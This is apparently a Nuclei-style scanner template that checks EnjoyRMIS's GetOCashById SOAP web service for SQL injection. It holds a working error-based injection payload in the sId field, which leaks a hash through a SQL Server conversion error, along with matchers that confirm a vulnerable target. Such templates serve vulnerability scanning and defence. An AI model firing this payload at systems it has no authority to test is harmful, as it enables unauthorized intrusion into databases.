folder-5/poc-yaml-enjoyrmis-getocashbyid-sqli.yaml

id: poc-yaml-enjoyrmis-getocashbyid-sqli
info:
  name: EnjoyRMIS GetOCashById SQL Injection Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  description: |
    SQL Injection vulnerability in EnjoyRMIS GetOCashById function that allows an attacker to influence SQL queries.

variables:
  t1: "{{rand_int(1000, 10000)}}"
  t2: "{{md5(t1)}}"

http:
  - raw:
      - |
        POST /EnjoyRMIS_WS/WS/POS/cwsoa.asmx HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/xml; charset=utf-8
        SOAPAction: "http://tempuri.org/GetOCashById"

        <?xml version="1.0" encoding="utf-8"?>
        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
          <soap:Body>
            <GetOCashById xmlns="http://tempuri.org/">
              <sId>string' AND 1234 IN (SELECT (sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}')))) AND 'uXof'='uXof</sId>
            </GetOCashById>
          </soap:Body>
        </soap:Envelope>

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500
      - type: word
        part: body
        words:
          - "soap:Server"
          - "在将"
          - "转换成数据类型"
          - "{{t2}}"
      - type: word
        part: header
        words:
          - "text/xml"
